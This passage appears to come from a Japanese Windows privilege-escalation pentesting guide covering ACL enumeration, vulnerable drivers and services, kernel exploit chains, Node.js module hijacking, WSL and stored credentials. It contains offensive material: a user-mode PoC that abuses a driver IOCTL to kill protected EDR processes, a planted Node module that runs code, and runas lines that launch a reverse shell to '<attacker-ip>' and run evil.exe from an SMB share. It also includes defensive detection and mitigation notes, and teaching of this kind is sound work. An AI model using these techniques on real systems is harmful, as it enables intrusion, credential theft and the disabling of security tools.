オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込む場合があります。特権アカウントでこのヘルパーを起動するスケジュールタスクまたはサービスがあると、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限での書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながる可能性があります。特権アカウントで実行されることと、**両方**の付随ファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

スケジュールタスクの場合は、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つの付随ファイルのパスに対する ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手がかりにすぎず、タスクがそこで入力ファイルを読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると思い込まず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして権限昇格できる可能性があります）と、**フォルダー**の権限を確認してください（[DLL Hijacking](dll-hijacking/index.html)）。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置き換えに失敗した場合に、既存の書き込み保護されたファイルを実行していた古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている完全なパッチレベルと、影響を受ける agent の操作を実行できるかを確認してください。`2.1` のようなブランチのみの表示では、脆弱性の有無を判断できません。列挙では、ファイルの作成や agent コマンドの実行を行わずに、バージョン、サービスの状態、Temp のアクセス許可を確認できます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は build 6210 以前の ADSelfService Plus に影響し、ベンダーは build 6211 で修正しました。SAML SSO が**現在または過去に**有効だった場合にのみ関係します。そのため、インストール済み製品の情報やサービスのパスは手掛かりであり、脆弱性の判定ではありません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。サービス経由のコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM 権限で実行されるのは、SYSTEM で実行されているインスタンスに限られます。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別の暗号化バックアップに関する手掛かりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せずに、そのパスとアクセス権を記録してください。

#### Jenkins コントローラーとドメインアカウントの境界

Windows の Jenkins コントローラーでは、ジョブの作成または設定権限と、ジョブの開始権限を区別してください。[Jenkins ではこれらを個別の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別のビルド実行経路になる場合もありますが、それが有効で、実際にビルドが実行されることを確認してください。実行時の ID はコントローラーまたは選択された agent の ID であり、保存された認証情報を使用できるのは、ジョブがそのスコープにアクセスできる場合に限られます。これとは別に、`JENKINS_HOME` のメタデータへのアクセスを確認してください。Jenkins は認証情報のデータと暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins のシークレットストレージ](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけでは、パスワードが判明したことにはなりません。共有出力にシークレットを表示せずに、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認してください。そのアカウントに AD ユーザーオブジェクトの `scriptPath` 書き込み権限がある場合、ユーザー間の実行と見なす前に、書き込み可能なスクリプトパスと、対象ユーザーとして実行される実際のログオンまたはスケジュール済みの実行主体があることを確認してください。さらにグループを制御できるかどうかは、実効 AD 権限を別途確認する必要があります。

#### Azure Pipelines のセルフホステッド agent の ID

Azure DevOps Server または Azure Pipelines プロジェクトでは、パイプラインの**作成または編集**権限と、パイプラインを**キューに登録**して選択した agent pool を使用する権限を区別してください。[Microsoft はパイプラインの権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を個別に説明しています。権限の低いアカウントがスクリプトステップを送信し、そのパイプラインをセルフホステッド Windows agent で実行できる場合、そのステップは[agent に設定されたオペレーティングシステムアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザー間または SYSTEM への権限移行を主張する前に、対象のパイプライン、ブランチやリソースの制限、認可された pool、実行可能なジョブ、agent サービスの ID を確認してください。agent のインストール、プロジェクトのロール、またはリポジトリへの書き込み権限だけでは、いずれも手掛かりにすぎません。受動的な列挙ではビルドを開始せずに、権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL データベースにアクセスする **ADSync サービスアカウント**と、ディレクトリ権限が設定された同期機能によって異なる **AD DS コネクタアカウント**を区別しています。コネクタの認証情報はデータベース内に暗号化して保存され、鍵のデータは[ADSync サービスアカウントの DPAPI によって保護されています](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者権限を持つように見えるグループがあること、またはデータベースを参照できることだけでは、復号可能な認証情報やドメイン権限昇格の証拠にはなりません。実際のデータベース読み取り権限、サービスアカウントと鍵へのアクセス、インストール先と SQL の構成、設定されたコネクタ ID、その ID の実効 AD 権限をそれぞれ確認してください。通常の列挙ではサービスとアクセスに関するメタデータのみを表示し、保存されたシークレットを照会したり表示したりしないでください。

#### プリンタードライバーのサポート DLL のアクセス許可

インストール済みのプリンタードライバーは、サポート DLL を `C:\ProgramData` 以下に置き、より高い権限を持つ印刷プロセスで読み込む場合があります。プリンターの WMI 列挙が拒否される場合でも、親ディレクトリや再解析ポイントを含め、対象ドライバーのディレクトリと DLL の ACL を確認してください。[Ricoh のプリンタードライバーに関する問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みについて説明されています。書き込み可能な ACL は手掛かりにすぎません。拒否エントリを考慮した実効書き込み権限、該当するドライバーがインストールされていて特権 ID でファイルを読み込むこと、ベンダーの更新済みドライバーまたはセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから脆弱性を推定しないでください。

### 書き込み権限

特別なファイルを読み取るために設定ファイルを変更できるか、または Administrator アカウントで実行されるバイナリ（schedtasks）を変更できるか確認してください。

システム内のアクセス許可が弱いフォルダーやファイルを見つけるには、次のようにします。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ は、`plugins` サブフォルダー内にあるすべてのプラグイン DLL を自動的に読み込みます。書き込み可能な portable/copy install が存在する場合、悪意のあるプラグインを配置すると、起動のたびに `notepad++.exe` 内でコードが自動実行されます（`DllMain` やプラグインのコールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリまたはバイナリを上書きできるか確認してください。**\
**権限昇格に利用できる興味深い autoruns の場所については、次のページを読んでください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審なドライバーや脆弱なドライバー**がないか探してください。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順はこちらを参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

関連する Windows kernel-exploitation の資料：

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race-condition bug では、lookup を意図的に遅らせる（最大長の component や深い directory chain を使う）ことで、競合ウィンドウを数マイクロ秒から数十マイクロ秒に延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、単体では弱い2つの bug を組み合わせて構築できるものがあります。1つは、queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を漏えいさせる **lock-release-before-copy** disclosure です。<sup>[[29]](#references)</sup>

監査と exploit のメモ：

- **Free-under-lock + cancel afterwards**：成功パスが **Acquire -> CompleteRequest/free -> Release** を行い、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を行う箇所を探します。成功パスが CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- 解放された queue object を、同じサイズの攻撃者制御 paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entry は payload と size を制御でき、後から pipe read/peek operation で調査できるため有用です。解放された object に list link が含まれている場合は、user memory 内の **循環 list of fake request node** で上書きすると、ドライバーは元の list head で処理を終了せず、攻撃者定義の request structure を繰り返し処理します。
- **予測可能な write を強化する**：fake request が bookkeeping write（timestamp / QPC / refcount 近傍の field）で使われる nested context pointer をリダイレクトする場合、**アドレスは制御できるが値は制御できない** kernel write を得られることがあります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、破損した object から **out-of-bounds paged-pool read** が得られるまで spray を列挙します。
- **Raceable disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な候補です。攻撃者がコピーされる buffer を拡大できる場合（たとえば、多数の list/resource entry を追加して serializer の最終 allocation size を大きくする場合）、信頼性が向上します。copy 時間が長くなり、必ずしもマシンをクラッシュさせずに replacement window を広げられるためです。
- **Pointer-rich refill target**：Windows の **I/O ring** registered-buffer array は、paged-pool size が攻撃者制御（`8 * regBufferCnt`）で、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、disclosure target として優れています。array を1つ leak し、周囲の `IORING_OBJECT` を特定した後、**`RegBuffers`** と **`RegBuffersCount`** を破損させると、後続の I/O ring operation に攻撃者が偽造した entry を使わせ、任意の kernel read/write を実現できます。利用できる write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` の値）しか書けない場合は、**unaligned write を重ねて** `0x0101010101010101` のような同じ byte の繰り返しからなる user pointer を作り、`VirtualAlloc` で map して、その場所に偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

有用な debugging indicator：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once you obtain arbitrary kernel read/write from the corrupted I/O ring, 標準的な post-primitive workflow で SYSTEM token を窃取します:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### レジストリハイブのメモリ破損プリミティブ

最新のハイブ脆弱性では、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子キーを悪用し、カスタムドライバーなしでメタデータの破損をカーネル paged-pool のオーバーフローに変換できます。攻撃チェーンの詳細はこちら:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる `RtlQueryRegistryValues` direct-mode の型混同

一部のドライバーはユーザーランドからレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証したうえで、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を使い、`RTL_QUERY_REGISTRY_DIRECT` で `int readValue` のようなスタック上のスカラーに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に基づいて解釈されます。

これにより、次の2つの有用なプリミティブが生まれます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` により、ドライバーに攻撃者が指定したキーをクエリさせ、戻り値やログを通じて存在を漏えいさせたり、呼び出し元が直接アクセスできない値を読み取らせたりできる場合があります。
- **カーネルメモリ破損**: `&readValue` のようなスカラーの書き込み先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定されたバイナリバッファとして型混同されます。

実践的な悪用に関する注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていないハイブ**をクエリすると、カーネル呼び出し元は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能性を維持するには、値を `HKCU` にステージングするのではなく、**信頼されたシステムハイブ内にある攻撃者が書き込み可能なキー**を探してください。
- **信頼されたハイブへのステージング**: NtObjectManager を使って `\Registry\Machine` の書き込み可能な子孫を列挙し、複製した**低整合性**トークンでスキャンを再実行して、サンドボックス化されたコンテキストからアクセス可能なキーを探します:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4バイトの`int`に8バイトを直接書き込むと、隣接するスタックデータが破損し、近くのコールバック／関数ポインターが部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが攻撃者制御の`REG_DWORD`をスタック上のスカラーに読み込み、その同じバッファーを文字列読み込みに再利用すると、攻撃者は`Length` / `MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、半ば制御可能なカーネル書き込みが発生します。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`にある最初の`LONG`を符号付きバッファーサイズとして扱います。先行する`REG_DWORD`読み込みによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリは攻撃者のバイト列を隣接するスタックスロットに直接コピーします。多くの場合、コールバックポインターを完全に上書きする最も簡単な方法です。

有力な探索パターン: **同じスタック変数への、型の異なるレジストリ読み込み。変数は再初期化されていないこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、最初のレジストリ読み込みによって2回目の読み込みが実行されるかどうかが決まるコードパスをgrepしてください。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPEN設定漏れの悪用（LPE + EDR kill）

一部の署名済みサードパーティードライバーは、IoCreateDeviceSecureを使って強力なSDDLを設定してデバイスオブジェクトを作成しますが、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れています。このフラグがないと、余分なコンポーネントを含むパス経由でデバイスを開いたときにセキュアDACLが適用されず、特権のないユーザーでも次のような名前空間パスを使ってハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

ユーザーがデバイスを開けると、ドライバーが公開している特権IOCTLを悪用して、LPEや改ざんを実行できます。実環境で確認された機能の例:
- 任意のプロセスに対するフルアクセスハンドルを返す（トークン窃取 / DuplicateTokenEx/CreateProcessAsUserによるSYSTEMシェル）。
- 制限のないraw diskの読み書き（オフライン改ざん、ブート時の永続化手法）。
- Protected Process/Light (PP/PPL)を含む任意のプロセスを終了し、カーネル経由でユーザーランドからAV/EDR killを実行する。

最小限のPoCパターン（ユーザーモード）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLで制限するデバイスオブジェクトを作成する際は、必ずFILE_DEVICE_SECURE_OPENを設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPLのチェックを追加する。
- IOCTLを制限する（アクセスマスク、METHOD_*、入力検証）。カーネル特権を直接使う代わりに、ブローカー経由のモデルも検討する。

防御側向けの検知方法
- 不審なデバイス名（例：\\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示す特定のIOCTLシーケンスを監視する。
- Microsoftの脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストも維持する。


## PATH DLL Hijacking

**PATH上にあるフォルダー内への書き込み権限**があれば、プロセスが読み込むDLLを乗っ取り、**権限を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH内のすべてのフォルダーのアクセス許可を確認します：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron モジュール解決ハイジャック

これは、期待されるモジュールが**存在しない**場合に、`require("foo")` のような裸の import を行う **Node.js** および **Electron** アプリケーションに影響する、**Windows の制御されていない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上へたどり、各親ディレクトリの `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートまで達することがあるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に検索する場合があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意ある `foo.js`（またはパッケージフォルダー）を仕込み、**より高い権限で動作する Node/Electron プロセス**が不足している依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者権限で実行されている場合、昇格されたスケジュール済みタスク／サービスラッパーから実行されている場合、または特権を持つデスクトップアプリとして自動起動されている場合は、**LPE**につながります。

これは特に、次のような場合によく見られます。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティ製ライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- パッケージが本番ビルドから削除されている、パッケージ化時に含まれていない、またはインストールに失敗している
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い位置にある

### 脆弱な対象の探索

**Procmon** を使用して解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` に `node_modules` が `contains` される条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションのソースコードで役立つコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースの確認から**不足しているパッケージ名**を特定します。
2. 存在しない場合は、root の検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 想定される名前と完全に一致するモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim application を起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際に存在するオプションモジュールの例には `bluebird` と `utf-8-validate` があります。ただし、再利用可能なのはこの**手法**です。特権で実行される Windows の Node/Electron プロセスが解決する、あらゆる**見つからない bare import**を探してください。

### 検出とハードニングのアイデア

- ユーザーが `C:\node_modules` を作成したり、新しい `.js` ファイルやパッケージを書き込んだりした際にアラートを出します。
- `C:\node_modules\*` から読み込んでいる高い整合性レベルのプロセスを調査します。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査します。
- サードパーティーのコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認します。
- ライブラリが対応している場合は、オプションのプローブを無効にします（たとえば、一部の `ws` の導入環境では `WS_NO_UTF_8_VALIDATE=1` により、レガシーな `utf-8-validate` のプローブを回避できます）。

## ネットワーク

### 共有フォルダー

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hostsファイル

hostsファイルにハードコードされている他の既知のコンピューターを確認する。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースとDNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールされたタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるのは、その認証とコマンド制御が許可している場合に限られます。より高い権限で実行されるカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手がかりにすぎません。認証を伴うメモリ破損の経路を特定するには、その正確なバイナリと、そこに到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、転送先に到達可能であることや、脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォールルール

[**ファイアウォール関連のコマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートでリッスンできます（初めて `nc.exe` でポートをリッスンするとき、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash を root として簡単に起動するには、`--default-user root` を試してください。

`WSL` のファイルシステムは、フォルダー `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で確認できます。

WSL 内の Linux の `root` 権限だけでは、Windows の Administrator 権限は得られません。現在の Windows identity でディストリビューションのファイルシステムを読み取れる場合は、認証情報が記録されている可能性のあるコマンドを探すため、シェル履歴ファイル（`/root/.bash_history` を含む）を確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに該当します。WSL 2 では通常、ディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙中に履歴の内容を出力しないでください。

## Windows の認証情報

### Winlogon の認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。`DefaultPassword` または `AltDefaultPassword` に空でない値があれば、レジストリに平文のパスワードが保存されていることを示します。`AutoAdminLogon=1` でも、平文のパスワードが読み取れない場合は、あくまで手掛かりにすぎません。[Sysinternals Autologon はパスワードを LSA secret として保存できます](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得できるかは確認できません。認証情報の露出を報告する前に、アクセス権と実際のログオン構成を確認してください。

### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault は、サーバー、Webサイト、その他のプログラム用の認証情報を保存します。これらの認証情報は、**Windows** がユーザーを**自動的にログインさせる**ために使用できます。一見すると、Facebook、Twitter、Gmail などのサイト用認証情報を保存してブラウザーに自動ログインさせられるように思えるかもしれませんが、そうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるために使用できる認証情報を保存します。つまり、リソース（サーバーまたはWebサイト）へのアクセスに認証情報が必要な **Windows アプリケーションは、この Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を利用することはできないと思います。そのため、アプリケーションで Vault を利用する場合は、何らかの方法で**Credential Manager と通信し、既定のストレージ Vault からそのリソース用の認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するには、`/savecred` オプションを指定して `runas` を実行します。以下の例では、SMB share 経由でリモートバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された資格情報を使って `runas` を使用する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)を使用する方法もあります。

### UWP PasswordVault / Credential Locker

